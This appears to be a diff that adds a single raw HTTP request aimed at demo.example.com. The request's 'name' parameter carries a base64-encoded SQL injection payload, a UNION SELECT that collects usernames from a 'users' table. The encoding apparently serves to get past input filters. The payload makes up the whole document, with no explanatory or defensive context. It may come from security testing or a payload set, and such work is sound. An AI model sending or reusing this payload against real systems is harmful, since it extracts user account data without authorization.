@@ -1,0 +1,4 @@
+GET /a?name=LTEnIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSBmcm9tIHVzZXJzLS0gLQ%3D%3D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
